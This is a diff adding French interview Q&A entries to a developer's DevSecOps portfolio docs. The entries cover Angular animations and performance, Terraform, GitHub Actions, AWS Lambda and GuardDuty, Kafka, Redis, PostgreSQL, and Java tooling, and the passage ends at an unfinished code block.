@@ -2591,3 +2591,2381 @@ Ce portfolio répond directement à cette question :
 4. **Je suis autonome** : ce projet a été construit de zéro, de l'architecture à la production, en autonomie complète.
 
 5. **Je documente** : les questions d'entretien que vous me posez ont leurs réponses dans `docs/INTERVIEW-QUESTIONS.md` — parce que je pense toujours à la transmission et à la maintenabilité.
+
+---
+
+## GSAP & UX Animations (Phase 22)
+
+### Q201 — Qu'est-ce que GSAP et ScrollTrigger, et comment les avez-vous intégrés dans Angular ?
+
+GSAP (GreenSock Animation Platform) est la bibliothèque JavaScript d'animation la plus utilisée en production — elle surpasse les animations CSS pour les scénarios complexes (synchronisation, timeline, scrubbing).
+
+**ScrollTrigger** est un plugin GSAP qui lie les animations au défilement de la page (scroll position ou scroll velocity). Dans ce projet (Phase 22) :
+
+1. `npm install gsap` — GSAP est tree-shakable, seuls les modules utilisés sont bundlés
+2. `gsap.registerPlugin(ScrollTrigger)` dans `ngOnInit` ou via un service singleton
+3. Les animations sont créées dans `ngAfterViewInit` (le DOM doit être prêt) avec `@ViewChild` pour cibler les éléments
+
+Exemple concret — effet d'apparition des cartes projet :
+```typescript
+ngAfterViewInit() {
+  gsap.from(this.cards.nativeElement.querySelectorAll('.card'), {
+    scrollTrigger: {
+      trigger: this.cards.nativeElement,
+      start: 'top 80%',
+      toggleActions: 'play none none reverse'
+    },
+    y: 60, opacity: 0, stagger: 0.15, duration: 0.8, ease: 'power2.out'
+  });
+}
+```
+
+**Nettoyage obligatoire** dans `ngOnDestroy` :
+```typescript
+ngOnDestroy() {
+  ScrollTrigger.getAll().forEach(st => st.kill());
+}
+```
+
+---
+
+### Q202 — Quels problèmes de performance faut-il éviter avec GSAP dans Angular ?
+
+Deux pièges principaux :
+
+1. **Animations hors zone Angular** : GSAP modifie le DOM en dehors du `NgZone`. Avec `ChangeDetectionStrategy.OnPush`, appeler GSAP via `ngZone.runOutsideAngular(() => { ... })` évite des cycles de détection inutiles. Pour déclencher un re-rendu si nécessaire : `ngZone.run(() => { ... })`.
+
+2. **Fuite mémoire ScrollTrigger** : chaque `ScrollTrigger` crée des event listeners sur le scroll. Sans `kill()` dans `ngOnDestroy`, ils persistent même après destruction du composant → fuite mémoire sur les Single Page Apps avec routing. Pattern sûr : stocker les triggers dans un tableau et les tuer tous.
+
+3. **Performances de paint** : préférer les propriétés `transform` (GPU-composited) et `opacity` aux propriétés qui déclenchent un reflow (`width`, `height`, `top`, `left`). GSAP utilise `will-change: transform` automatiquement.
+
+---
+
+### Q203 — Quelle est la différence entre les animations CSS et GSAP ? Quand choisir l'un ou l'autre ?
+
+| | CSS Animations/Transitions | GSAP |
+|--|--------------------------|------|
+| Syntaxe | Déclarative (`.scss`) | Impérative (JS/TS) |
+| Séquençage | Limité (`animation-delay`) | Timeline complète |
+| Scrubbing | Impossible | Natif (`scrub: true`) |
+| Callbacks | Non | `onComplete`, `onUpdate` |
+| Performance | Excellente (GPU natif) | Excellente (optimisé GPU) |
+| Interactivité | Limitée | Totale (pause, reverse, seek) |
+
+**Règle de décision** :
+- Hover, focus, transition simple → **CSS** (plus performant, aucune dépendance)
+- Animation synchronisée au scroll, timeline multi-étapes, storytelling → **GSAP**
+- Angular Animations (enter/leave) → bon compromis pour les transitions de routes
+
+Dans ce projet, la navigation et les micro-interactions utilisent CSS, les animations de scroll (Phase 22) utilisent GSAP.
+
+---
+
+## Angular Avancé (suite)
+
+### Q204 — Qu'est-ce que le bloc `@defer` Angular et dans quels cas l'utiliser ?
+
+`@defer` (Angular 17+) est un mécanisme de chargement différé au niveau du template. Contrairement au lazy loading des routes, il diffère le chargement d'un composant individuel.
+
+```html
+@defer (on viewport) {
+  <app-heavy-chart />
+} @placeholder {
+  <div class="skeleton-chart"></div>
+} @loading {
+  <app-spinner />
+} @error {
+  <p>Impossible de charger le graphique.</p>
+}
+```
+
+Déclencheurs disponibles :
+- `on viewport` : quand l'élément entre dans le viewport (IntersectionObserver)
+- `on interaction` : au clic/focus
+- `on idle` : quand le navigateur est inactif
+- `on timer(2s)` : après un délai
+- `when condition` : sur une expression booléenne
+
+**Cas d'usage dans ce projet** : les graphiques Grafana embarqués ou les cartes de projets hors écran. `@defer (on viewport)` améliore le LCP et réduit le bundle initial.
+
+---
+
+### Q205 — Qu'est-ce que le mode "Zoneless" Angular et quel est son intérêt ?
+
+Depuis Angular 18, il est possible de désactiver `zone.js` complètement. `zone.js` interceptait tous les events asynchrones (setTimeout, HTTP, événements DOM) pour déclencher la détection de changement — un patch global lourd (~30kb).
+
+Sans `zone.js` :
+- La détection de changement est **manuelle ou basée sur les Signals**
+- Bundle réduit de ~30kb
+- Performances améliorées (pas de patching de toutes les APIs async)
+- Meilleure compatibilité avec les web workers
+
+Configuration dans ce projet :
+```typescript
+// app.config.ts
+provideExperimentalZonelessChangeDetection()
+```
+
+**Prérequis** : tous les composants doivent être en `ChangeDetectionStrategy.OnPush` et utiliser des Signals ou `markForCheck()` pour déclencher les mises à jour. Ce projet remplit ces conditions.
+
+---
+
+## Terraform Avancé
+
+### Q206 — Qu'est-ce que les Terraform Workspaces et quand les utiliser ?
+
+Les workspaces Terraform permettent d'avoir plusieurs états (`terraform.tfstate`) distincts à partir du même code Terraform.
+
+```bash
+terraform workspace new staging
+terraform workspace select prod
+terraform apply  # déploie dans le workspace actif
+```
+
+Chaque workspace a son propre state — idéal pour des environnements similaires (dev/staging/prod) avec des variables différentes.
+
+**Limitations** : les workspaces partagent le même backend — un `terraform destroy` mal ciblé peut impacter le mauvais environnement. Alternative recommandée pour de vraies isolations : **comptes AWS séparés** par environnement (AWS Organizations), avec un state backend S3 dédié par compte.
+
+Dans ce projet : pas de workspaces (portfolio solo). En entreprise : workspace ou comptes séparés + modules réutilisables.
+
+---
+
+### Q207 — Qu'est-ce que Checkov et comment l'utilisez-vous pour sécuriser Terraform ?
+
+Checkov est un scanner d'IaC (Infrastructure as Code) statique. Il analyse les fichiers Terraform (et CloudFormation, K8s, Dockerfile) avant l'apply pour détecter des misconfiguraitons de sécurité.
+
+```bash
+checkov -d terraform/ --framework terraform
+```
+
+Exemples de règles vérifiées :
+- `CKV_AWS_57` : S3 bucket avec versioning désactivé
+- `CKV_AWS_24` : Security Group avec port 22 ouvert à 0.0.0.0/0
+- `CKV_AWS_28` : RDS sans backup automatique
+- `CKV_AWS_8` : EC2 sans instance metadata service v2 (IMDSv2)
+
+Dans le CI/CD, Checkov s'intègre comme étape pré-deploy :
+```yaml
+- name: Checkov IaC Scan
+  uses: bridgecrewio/checkov-action@v12
+  with:
+    directory: terraform/
+    soft_fail: true  # false en production
+```
+
+---
+
+## API Design
+
+### Q208 — Quelles stratégies de versioning d'API REST connaissez-vous ? Laquelle avez-vous choisie ?
+
+Quatre approches :
+
+1. **URL path** : `/api/v1/projects` → la plus visible et la plus cacheable. Recommandée pour les APIs publiques.
+2. **Query parameter** : `/api/projects?version=1` → simple mais non-standard.
+3. **Header** : `Accept: application/vnd.portfolio.v1+json` → propre, invisible dans l'URL, moins cacheable.
+4. **Subdomain** : `v1.api.example.com` → infrastructure plus complexe.
+
+Dans ce projet : versioning par **URL path** (`/api/v1/...`). Avantages : visible dans les logs, directement testable avec curl, compatible avec les gateways et proxies standard.
+
+**Règle** : ne pas versionner prématurément — une API interne à un seul client n'a pas besoin de versioning. Versionner quand des clients tiers dépendent de l'API.
+
+---
+
+### Q209 — Comment Spring Boot génère-t-il la spec OpenAPI et comment la personnalisez-vous ?
+
+Spring Boot + `springdoc-openapi-ui` génère automatiquement la spec OpenAPI 3 à partir des annotations Spring :
+
+```java
+// pom.xml
+<dependency>
+  <groupId>org.springdoc</groupId>
+  <artifactId>springdoc-openapi-starter-webmvc-ui</artifactId>
+</dependency>
+```
+
+La spec est disponible sur `/v3/api-docs` (JSON) et `/swagger-ui.html` (UI interactive).
+
+Personnalisations appliquées :
+```java
+@Operation(summary = "Créer un projet", security = @SecurityRequirement(name = "Bearer"))
+@ApiResponse(responseCode = "201", description = "Projet créé")
+@ApiResponse(responseCode = "400", description = "Données invalides")
+public ResponseEntity<ProjectResponse> createProject(@Valid @RequestBody ProjectRequest request)
+```
+
+Dans ce projet, la spec OpenAPI est la cible du scan ZAP DAST — c'est pourquoi elle est exposée (en prod, la désactiver ou la protéger derrière un SG).
+
+---
+
+## GitHub Actions Avancé
+
+### Q210 — Qu'est-ce que les GitHub Actions Environments et les protection rules ?
+
+Les Environments permettent de définir des règles de déploiement par cible (dev, staging, prod).
+
+**Protection rules disponibles** :
+- **Required reviewers** : un humain doit approuver avant le déploiement
+- **Wait timer** : délai obligatoire entre le push et le déploiement
+- **Deployment branches** : seule la branche `main` peut déployer en prod
+
+```yaml
+jobs:
+  deploy-prod:
+    environment:
+      name: production
+      url: https://charrad-devsecops.duckdns.org
+    runs-on: ubuntu-latest
+```
+
+Dans ce projet, `deploy-app.yml` utilise un environment `production`. En équipe, on y ajouterait 2 reviewers obligatoires avant tout déploiement production — audit trail complet dans GitHub.
+
+---
+
+### Q211 — Qu'est-ce que les GitHub Actions Reusable Workflows et Composite Actions ?
+
+**Reusable Workflows** (`workflow_call`) : un workflow complet réutilisable par d'autres workflows.
+```yaml
+# .github/workflows/deploy-template.yml
+on:
+  workflow_call:
+    inputs:
+      environment: {required: true, type: string}
+```
+
+**Composite Actions** (`action.yml`) : séquence d'étapes regroupées en une seule action réutilisable.
+
+**Différence** : les reusable workflows ont leurs propres runners (parallélisation possible), les composite actions s'exécutent dans le runner appelant.
+
+Dans ce projet, un candidat à la refactoring serait d'extraire les étapes communes aux workflows CI backend et frontend (checkout, setup Java, cache Maven) en composite action pour réduire la duplication.
+
+---
+
+## AWS Lambda Avancé
+
+### Q212 — Qu'est-ce que le cold start Lambda et comment le réduire ?
+
+Un cold start se produit quand Lambda doit initialiser un nouveau container d'exécution (runtime, dépendances, connexions DB). Sur Node.js, c'est ~100-300ms. Sur JVM (non utilisé ici pour les Lambdas), c'est 2-5 secondes.
+
+**Réductions appliquées dans ce projet** :
+- **Runtimes légers** : Node.js 22.x (natif) plutôt que JVM pour les 3 Lambdas
+- **Bundle minimal** : chaque Lambda n'inclut que ses dépendances (`@aws-sdk/client-ses` seulement pour contact-form)
+- **Éviter les connexions globales** : ne pas initialiser de connexion DB dans le handler (hors scope)
+
+**Techniques avancées** (si besoin) :
+- **Provisioned Concurrency** : pré-chauffe N instances → cold start = 0ms, coût fixe
+- **SnapStart** (Java 21 Lambda) : snapshot de la JVM initialisée → cold start < 1s
+- **Ping régulier** : EventBridge toutes les 5 minutes pour garder les containers chauds (hack)
+
+---
+
+### Q213 — Qu'est-ce que les Lambda Layers et comment les avez-vous utilisés ?
+
+Un Layer est une archive ZIP contenant du code ou des dépendances partagées entre plusieurs Lambdas. Il est monté en `/opt/` dans l'environnement d'exécution.
+
+Dans ce projet (Phase 15) :
+- **Layer `sharp`** : la bibliothèque Sharp (traitement d'images) est volumineuse (~25MB). En la plaçant dans un Layer, les 3 Lambdas n'ont pas à la redéployer. Chaque `terraform apply` est plus rapide.
+- **Layer de dépendances AWS SDK** : partagé entre `contact-form`, `image-resize` et `weekly-report`
+
+```hcl
+resource "aws_lambda_layer_version" "sharp_layer" {
+  filename            = "layers/sharp-layer.zip"
+  layer_name          = "sharp-image-processing"
+  compatible_runtimes = ["nodejs22.x"]
+}
+```
+
+Avantage supplémentaire : taille du déploiement Lambda réduite → déploiements plus rapides et durée maximale de 250MB toujours respectée.
+
+---
+
+## Sécurité & Compliance
+
+### Q214 — Quelle est la différence entre JWT (Bearer) et OAuth2/OIDC ? Quand utiliser l'un ou l'autre ?
+
+**JWT** est un format de token. **OAuth2** est un protocole d'autorisation. **OIDC** est OAuth2 + couche d'identité (authentication).
+
+| | JWT (ce projet) | OAuth2/OIDC |
+|--|----------------|-------------|
+| Auth server | Spring Boot lui-même | Serveur tiers (Keycloak, Auth0, Cognito) |
+| Cas d'usage | API interne, portfolio perso | SSO enterprise, login social |
+| Complexité | Faible | Élevée |
+| Single Sign-On | Non | Oui (un login, plusieurs apps) |
+| Refresh Token | Implémenté manuellement | Standard OAuth2 |
+
+**Dans ce projet** : JWT auto-géré par Spring Boot (`JwtTokenProvider`) — approprié pour une API portfolio avec un seul client Angular. 
+
+**En enterprise** : Keycloak ou AWS Cognito pour le SSO entre applications, la gestion des rôles LDAP/AD, et déléguer la sécurité auth à un serveur dédié.
+
+---
+
+### Q215 — Comment avez-vous adressé la conformité RGPD dans ce projet ?
+
+Le RGPD (Règlement Général sur la Protection des Données) encadre le traitement des données personnelles des citoyens européens.
+
+Mesures appliquées :
+1. **Données minimales** : le formulaire de contact collecte uniquement nom, email, message — rien de superflu
+2. **Durée de rétention** : les logs CloudWatch ont une rétention de 30 jours (pas de conservation indéfinie)
+3. **Chiffrement** : données en transit (HTTPS) et au repos (RDS chiffré, Secrets Manager chiffré KMS)
+4. **Localisation** : infrastructure en `eu-west-3` (Paris) — données hébergées en UE
+5. **Accès** : seul l'admin (IAM Role dédié) peut accéder aux données
+
+**Ce qui manquerait pour une vraie app RGPD** :
+- Politique de confidentialité affichée
+- Droit à l'effacement (DELETE /users/{id} implémenté)
+- Consentement explicite (cookie banner)
+- DPA (Data Processing Agreement) avec AWS
+
+---
+
+## SRE & Métriques
+
+### Q216 — Qu'est-ce que les SLI, SLO, SLA et l'Error Budget ? Donnez des exemples concrets.
+
+Ces quatre concepts forment le cadre de fiabilité SRE (Site Reliability Engineering) :
+
+- **SLI** (Service Level Indicator) : la métrique mesurée. Ex : `taux de requêtes réussies = requêtes_200 / total_requêtes`
+- **SLO** (Service Level Objective) : l'objectif interne. Ex : SLI ≥ 99.5% sur 30 jours glissants
+- **SLA** (Service Level Agreement) : le contrat client. Ex : disponibilité 99% garantie, sinon compensation. Toujours moins ambitieux que le SLO.
+- **Error Budget** : ce qu'il reste avant de casser le SLO. Ex : SLO 99.5% sur 30 jours = 0.5% × 43200 min = **216 minutes de downtime autorisées**
+
+**Usage de l'error budget** :
+- Budget restant > 50% → équipe peut déployer fréquemment, expérimenter
+- Budget restant < 10% → gel des déploiements risqués, focus fiabilité
+- Budget épuisé → post-mortem obligatoire, road map gelée
+
+Dans ce projet, ces métriques sont calculables via Prometheus (`rate(http_server_requests_seconds_count{status!~"5.."}[30d])`) mais pas encore formellement définies.
+
+---
+
+## Web Performance
+
+### Q217 — Qu'est-ce que les Web Vitals (LCP, CLS, INP) et comment les mesurez-vous dans Angular ?
+
+Les **Core Web Vitals** sont les métriques de performance UX définis par Google, intégrés dans le ranking SEO :
+
+- **LCP** (Largest Contentful Paint) : temps avant que le plus grand élément visible soit chargé. Objectif : < 2.5s. Dans ce projet, c'est la hero image de la page d'accueil.
+- **CLS** (Cumulative Layout Shift) : somme des décalages de mise en page inattendus. Objectif : < 0.1. Causé par des images sans dimensions définies, des fonts qui se chargent tard.
+- **INP** (Interaction to Next Paint, remplace FID) : réactivité aux interactions. Objectif : < 200ms. Problématique si le thread JS est bloqué (heavy Angular component).
+
+**Mesure** :
+```bash
+# Lighthouse CI dans le pipeline
+npx @lhci/cli autorun --upload.target=temporary-public-storage
+```
+
+```typescript
+// Angular API native
+import { onINP, onLCP, onCLS } from 'web-vitals';
+onLCP(metric => console.log('LCP:', metric.value));
+```
+
+---
+
+## Docker Avancé
+
+### Q218 — Qu'est-ce que Docker BuildKit et en quoi améliore-t-il les builds ?
+
+BuildKit est le backend de build Docker (activé par défaut depuis Docker 23). Améliorations majeures :
+
+1. **Cache monté** : partager le cache Maven/npm entre builds sans le copier dans l'image
+```dockerfile
+# syntax=docker/dockerfile:1
+RUN --mount=type=cache,target=/root/.m2 mvn package -DskipTests
+```
+Le cache Maven persiste entre les builds CI → division par 5 du temps de build.
+
+2. **Parallélisme** : les stages multi-stage indépendants sont buildés en parallèle.
+
+3. **Secrets sécurisés** : passer des secrets sans les stocker dans les layers
+```dockerfile
+RUN --mount=type=secret,id=npmrc cat /run/secrets/npmrc
+```
+
+4. **Build pour plusieurs architectures** :
+```bash
+docker buildx build --platform linux/amd64,linux/arm64 -t mon-image .
+```
+Utile pour les images qui doivent tourner sur M1 Mac (arm64) et EC2 (amd64).
+
+Dans ce projet, le CI utilise `docker/setup-buildx-action` pour activer BuildKit.
+
+---
+
+## Java & Build
+
+### Q219 — Qu'est-ce qu'un Maven BOM (Bill of Materials) et pourquoi l'utiliser ?
+
+Un BOM est un POM spécial qui centralise les versions de dépendances. Au lieu de définir la version de chaque dépendance, on importe le BOM et on laisse Maven gérer les versions compatibles entre elles.
+
+```xml
+<dependencyManagement>
+  <dependencies>
+    <dependency>
+      <groupId>org.springframework.boot</groupId>
+      <artifactId>spring-boot-dependencies</artifactId>
+      <version>3.4.0</version>
+      <type>pom</type>
+      <scope>import</scope>
+    </dependency>
+  </dependencies>
+</dependencyManagement>
+
+<!-- Ensuite, plus besoin de version -->
+<dependency>
+  <groupId>org.springframework.boot</groupId>
+  <artifactId>spring-boot-starter-web</artifactId>
+</dependency>
+```
+
+**Dans ce projet** : `spring-boot-starter-parent` hérite du BOM Spring Boot → Spring Security, Jackson, Hibernate ont tous des versions pré-testées compatibles entre elles. Dependabot met à jour la version Spring Boot → toutes les dépendances BOM suivent.
+
+---
+
+## Redis Avancé
+
+### Q220 — Quelles sont les politiques d'éviction Redis et comment choisir la bonne ?
+
+Quand Redis atteint sa limite mémoire (`maxmemory`), il applique une politique d'éviction pour libérer de l'espace.
+
+| Politique | Comportement |
+|-----------|-------------|
+| `noeviction` | Erreur si limite atteinte — pour les données critiques |
+| `allkeys-lru` | Évicte les clés les moins récemment utilisées parmi toutes |
+| `volatile-lru` | LRU uniquement sur les clés avec TTL défini |
+| `allkeys-lfu` | Évicte les clés les moins fréquemment utilisées |
+| `volatile-ttl` | Évicte les clés dont le TTL expire le plus tôt |
+| `allkeys-random` | Éviction aléatoire |
+
+**Dans ce projet** : `volatile-lru` — les clés de cache ont toutes un TTL (5-10 min). Les clés sans TTL (sessions persistantes) ne sont jamais évictées. Configuration : `maxmemory-policy volatile-lru` dans `redis.conf`.
+
+**Piège** : utiliser `noeviction` pour un cache → Redis renvoie des erreurs au lieu de se dégrader gracieusement.
+
+---
+
+## Kafka Avancé
+
+### Q221 — Comment fonctionnent les Consumer Groups et les partitions dans Kafka ?
+
+**Partitions** : un topic Kafka est découpé en N partitions. Les messages sont distribués sur les partitions (via la clé du message ou round-robin). L'ordre est garanti **au sein d'une partition**, pas entre partitions.
+
+**Consumer Groups** : un groupe de consumers partage la consommation d'un topic. Kafka assigne exactement **une partition par consumer** dans le groupe. Avec 3 partitions et 3 consumers → parallélisme maximal. Avec 3 partitions et 5 consumers → 2 consumers sont inactifs.
+
+```
+Topic: portfolio.projects.created (3 partitions)
+Consumer Group: audit-group
+  Consumer 1 → Partition 0
+  Consumer 2 → Partition 1
+  Consumer 3 → Partition 2
+```
+
+**Offset** : chaque consumer maintient sa position (offset) dans sa partition. En cas de redémarrage, il reprend depuis le dernier offset commité (`enable.auto.commit=true` par défaut).
+
+Dans ce projet, les consumers Kafka sont configurés avec `groupId = "portfolio-consumers"` — utile si on scale le backend en plusieurs instances (chaque instance consomme des partitions différentes).
+
+---
+
+## AWS Avancé
+
+### Q222 — Qu'est-ce qu'AWS GuardDuty et comment l'avez-vous configuré ?
+
+GuardDuty est un service de détection de menaces managé AWS. Il analyse en continu :
+- **CloudTrail** : API calls suspects (ex: enumération IAM, accès depuis un pays inhabituel)
+- **VPC Flow Logs** : trafic réseau anormal (port scanning, communication avec des IPs malveillantes)
+- **DNS logs** : résolution de domaines malveillants connus
+
+Types de findings :
+- `UnauthorizedAccess:EC2/SSHBruteForce` — tentatives SSH répétées
+- `Recon:EC2/PortProbeEMRUnprotectedPort` — scan de ports
+- `CryptoCurrency:EC2/BitcoinTool.B` — mining de crypto sur l'EC2
+
+Dans ce projet, GuardDuty n'est pas activé (hors Free Tier après 30 jours — ~$10/mois pour un petit compte). En production, c'est indispensable et les findings se connectent à Security Hub pour une vue centralisée.
+
+---
+
+## Spring Boot Avancé
+
+### Q223 — Qu'est-ce que l'annotation `@Testcontainers` de Spring Boot 3.1+ ?
+
+Spring Boot 3.1 a introduit une intégration native avec Testcontainers via `@ServiceConnection` — plus de configuration manuelle des URLs de connexion.
+
+```java
+// Avant Spring Boot 3.1 — configuration manuelle
+@DynamicPropertySource
+static void registerProperties(DynamicPropertyRegistry registry) {
+  registry.add("spring.datasource.url", postgres::getJdbcUrl);
+  registry.add("spring.datasource.username", postgres::getUsername);
+}
+
+// Depuis Spring Boot 3.1 — @ServiceConnection
+@Testcontainers
+class ProjectRepositoryTest {
+  @Container
+  @ServiceConnection
+  static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>("postgres:15-alpine");
+
+  // Spring Boot détecte @ServiceConnection et configure automatiquement la datasource
+}
+```
+
+Avantage : zéro boilerplate, Spring Boot configure automatiquement la datasource, Redis, Kafka, RabbitMQ via `@ServiceConnection`. Dans ce projet, les tests d'intégration ont été mis à jour pour utiliser ce pattern.
+
+---
+
+## Réseau Avancé
+
+### Q224 — Qu'est-ce que le mTLS (mutual TLS) et dans quel contexte l'utiliser ?
+
+TLS classique : seul le serveur s'authentifie (certificat serveur). Le client est anonyme.
+
+**mTLS** (mutual TLS) : les deux parties s'authentifient avec un certificat X.509. Le serveur vérifie le certificat client, le client vérifie le certificat serveur.
+
+Cas d'usage :
+- **Communication inter-services** : microservice A appelle microservice B → mTLS garantit l'identité des deux (pas seulement le chiffrement)
+- **Zero Trust** : même dans un réseau interne, chaque service prouve son identité
+- **API Gateway** : AWS API Gateway supporte le mTLS pour les clients qui s'y connectent
+
+Dans ce projet : TLS classique (HTTPS Let's Encrypt). En architecture microservices, Istio (Q168) implémente le mTLS automatiquement entre pods sans modifier le code applicatif — c'est l'un de ses principaux atouts.
+
+---
+
+## Questions Comportementales Avancées
+
+### Q225 — Comment gérez-vous la dette technique dans un projet en cours ?
+
+La dette technique est inévitable — l'enjeu est de la rendre visible et de la gérer.
+
+**Approche appliquée dans ce projet** :
+1. **SonarCloud** : "Code Smells" et "Technical Debt" visibles à chaque PR. La dette est quantifiée en heures/jours.
+2. **`TODO` commentaires** : avec un format standard (`// TODO: DEBT - raison`) pour les retrouver facilement
+3. **Priorisation** : seule la dette qui impacte la sécurité, les performances ou la vélocité est prioritaire. La dette cosmétique attend.
+4. **"Boy Scout Rule"** : chaque fois qu'on touche un fichier, on le laisse un peu plus propre qu'on ne l'a trouvé
+5. **Budget dédié** : dans un vrai projet, réserver 20% du sprint pour la dette (pas traiter tout en urgence)
+
+**À ne pas faire** : laisser la dette s'accumuler silencieusement jusqu'à ce qu'elle bloque les nouvelles features.
+
+---
+
+### Q226 — Décrivez un désaccord technique avec un collègue et comment vous l'avez résolu.
+
+*(Question comportementale — réponse STAR)*
+
+**Situation** : lors de la Phase 3 (Frontend), j'avais initialement prévu d'utiliser NgRx pour la gestion d'état, convaincu que c'était la "bonne" approche pour une app enterprise.
+
+**Tâche** : décider de l'architecture de state management avant de coder les premiers composants.
+
+**Action** : j'ai prototypé les deux approches — NgRx avec Store/Actions/Reducers et une approche Services + BehaviorSubject + Signals. J'ai comparé : NgRx ajoutait 400 lignes de boilerplate pour 3 services CRUD simples. Les Signals résolvaient le même problème en 50 lignes.
+
+**Résultat** : j'ai documenté la comparaison dans `docs/PHASE3-Frontend.md`, expliqué le raisonnement, et adopté Services + Signals. Le critère décisif : la complexité doit être justifiée par un besoin réel, pas par le prestige de la technologie.
+
+**Leçon** : un désaccord technique se résout avec des données et des prototypes, pas avec de l'autorité.
+
+---
+
+## AWS Réseau Avancé
+
+### Q227 — Quelle est la différence entre VPC Peering et AWS Transit Gateway ?
+
+**VPC Peering** : connexion directe entre deux VPCs (même compte ou cross-account). Simple, sans coût de données (sauf cross-région). Limitation : **non transitif** — si A↔B et B↔C, A ne peut pas parler à C via B.
+
+**Transit Gateway** : hub central qui connecte N VPCs, VPNs et Direct Connects. Supporte le routage transitif. Idéal pour des architectures hub-and-spoke avec des dizaines de VPCs.
+
+| | VPC Peering | Transit Gateway |
+|--|-------------|-----------------|
+| Connexions | 1-à-1 | N-à-N |
+| Transitivité | Non | Oui |
+| Coût | Gratuit (même région) | ~$0.05/h + données |
+| Cas d'usage | 2-3 VPCs | 5+ VPCs |
+
+Dans ce projet : un seul VPC, pas de peering nécessaire. En enterprise multi-compte (dev/staging/prod en comptes séparés), Transit Gateway centralise la connectivité.
+
+---
+
+## PostgreSQL Avancé
+
+### Q228 — Comment utilisez-vous EXPLAIN ANALYZE pour optimiser une requête dans ce projet ?
+
+`EXPLAIN ANALYZE` exécute vraiment la requête et affiche le plan d'exécution avec les temps réels.
+
+```sql
+EXPLAIN ANALYZE
+SELECT p.*, ps.skill_id
+FROM projects p
+LEFT JOIN project_skills ps ON p.id = ps.project_id
+WHERE p.status = 'ACTIVE'
+ORDER BY p.sort_order;
+```
+
+Éléments à analyser :
+- **Seq Scan** vs **Index Scan** : un Seq Scan sur une grande table = pas d'index utilisé
+- **Rows** : si l'estimation est très différente de l'actuel → statistiques obsolètes (`ANALYZE`)
+- **cost** : coût relatif (en unités arbitraires). Le nœud avec le coût le plus élevé est le goulot.
+- **actual time** : temps réel en ms. Comparer `planning time` vs `execution time`.
+
+**Outils complémentaires** :
+- [explain.dalibo.com](https://explain.dalibo.com) : visualisation graphique du plan
+- `pg_stat_statements` : historique des requêtes lentes en production
+
+Dans ce projet, les migrations Flyway créent les index (`CREATE INDEX idx_projects_status ON projects(status)`) après avoir analysé les requêtes les plus fréquentes.
+
+---
+
+## Tests Avancés
+
+### Q229 — Comment implémenteriez-vous du rate limiting dans ce projet Spring Boot ?
+
+Trois approches par ordre de complexité :
+
+**1. Bucket4j (in-process, Redis-backed)**
+```java
+@RateLimiter(name = "authEndpoint", fallbackMethod = "rateLimitFallback")
+public ResponseEntity<AuthResponse> login(@RequestBody LoginRequest req) { ... }
+```
+Configuration : 5 tentatives/minute par IP, stockage Redis pour la cohérence entre instances.
+
+**2. Spring Cloud Gateway** : filter de rate limiting côté gateway, avant que la requête atteigne le backend.
+
+**3. AWS WAF** : rate limiting au niveau de l'infrastructure (1000 req/5min par IP), avant même que le trafic atteigne EC2.
+
+Dans ce projet, la détection de brute-force via Prometheus (Q12) est réactive (alerte après coup). Bucket4j + Redis serait la prochaine évolution pour du rate limiting préventif sur `/auth/login`.
+
+---
+
+## Question de clôture
+
+### Q230 — Quelle est la prochaine évolution prévue pour ce projet, et pourquoi ?
+
+Trois évolutions prioritaires, dans l'ordre :
+
+**1. HTTPS + mTLS pour les communications inter-services** (court terme)
+Les communications backend → RDS utilisent SSL mais pas de vérification du certificat client. Configurer `ssl-mode=verify-full` avec un certificat client serait un vrai Zero Trust.
+
+**2. OpenTelemetry Tracing distribué** (moyen terme)
+Actuellement : métriques (Micrometer + Prometheus) et logs (CloudWatch). Il manque la troisième colonne de l'observabilité — les **traces**. Micrometer Tracing + OTLP exporter vers un backend Tempo (Grafana) permettrait de corréler une requête HTTP à travers le backend, Redis, PostgreSQL, et les Lambdas.
+
+**3. Platform Engineering — Backstage** (long terme)
+Transformer ce portfolio en une véritable Internal Developer Platform avec Backstage : catalog de services, templates de microservices, golden paths, TechDocs auto-générée depuis les `docs/*.md`. C'est l'évolution naturelle du "You Build It, You Run It" vers le "We Enable You to Build and Run It".
+
+---
+
+## Java / JVM Avancé
+
+### Q231 — Qu'est-ce que Lombok et quels sont ses inconvénients ?
+
+Lombok est une librairie Java qui génère du boilerplate à la compilation via des annotations :
+- `@Getter`/`@Setter` → accesseurs
+- `@Builder` → pattern Builder fluent
+- `@Data` → `@Getter + @Setter + @ToString + @EqualsAndHashCode`
+- `@Slf4j` → injecte un logger `log`
+- `@RequiredArgsConstructor` → constructeur avec les champs `final`
+
+Dans ce projet, `@RequiredArgsConstructor` remplace l'injection par constructeur boilerplate.
+
+**Inconvénients** :
+1. **Magie invisible** : le code généré n'apparaît pas dans l'IDE sauf avec le plugin. Difficile pour les nouveaux arrivants.
+2. **`@Data` sur les entités JPA** : génère `equals/hashCode` sur tous les champs → deux entités avec le même `id` mais des listes chargées différemment peuvent avoir des `hashCode` différents → bugs subtils avec les collections.
+3. **Couplage à l'IDE** : nécessite un plugin Lombok dans IntelliJ/VS Code.
+4. **Pièges `@Builder`** : les valeurs par défaut des champs ne sont pas conservées sans `@Builder.Default`.
+
+**Règle** : utiliser `@Slf4j`, `@RequiredArgsConstructor`, `@Getter`. Éviter `@Data` sur les entités JPA — préférer des records ou des `equals/hashCode` explicites basés sur l'`id`.
+
+---
+
+### Q232 — Qu'est-ce que MapStruct et pourquoi l'utiliser plutôt que du mapping manuel ?
+
+MapStruct génère du code de mapping entre objets Java à la compilation (pas de réflexion au runtime).
+
+```java
+@Mapper(componentModel = "spring")
+public interface ProjectMapper {
+    ProjectResponse toResponse(Project project);
+    Project toEntity(ProjectRequest request);
+}
+```
+
+MapStruct génère l'implémentation à la compilation — type-safe, visible dans le code généré, sans réflexion.
+
+**Comparaison** :
+
+| | Mapping manuel | MapStruct | ModelMapper |
+|--|---------------|-----------|-------------|
+| Performance | Excellente | Excellente | Mauvaise (réflexion) |
+| Type safety | Oui | Oui | Non |
+| Maintenabilité | Faible (verbeux) | Bonne | Bonne |
+| Lisibilité | Faible | Bonne | Bonne |
+
+**Dans ce projet** : `ProjectMapper`, `SkillMapper`, `UserMapper` — chaque couche (entity ↔ DTO) a son mapper. Si un champ change dans l'entité, MapStruct génère une erreur de compilation immédiatement → aucun bug silencieux.
+
+---
+
+### Q233 — Comment configurez-vous `@PreAuthorize` avec des expressions SpEL complexes ?
+
+`@PreAuthorize` utilise SpEL (Spring Expression Language) pour les règles d'autorisation fines.
+
+```java
